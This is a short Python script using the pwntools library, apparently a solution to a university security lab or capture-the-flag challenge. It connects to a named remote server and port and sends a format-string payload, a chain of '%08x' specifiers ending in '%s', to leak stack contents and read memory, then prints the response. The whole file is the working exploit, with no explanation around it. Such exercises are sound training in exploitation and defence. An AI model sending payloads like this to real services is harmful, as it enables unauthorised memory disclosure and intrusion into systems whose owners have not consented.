from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22190

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'%08x.%08x.%08x.%08x.%08x.%08x.%s')
print(s.recv(512))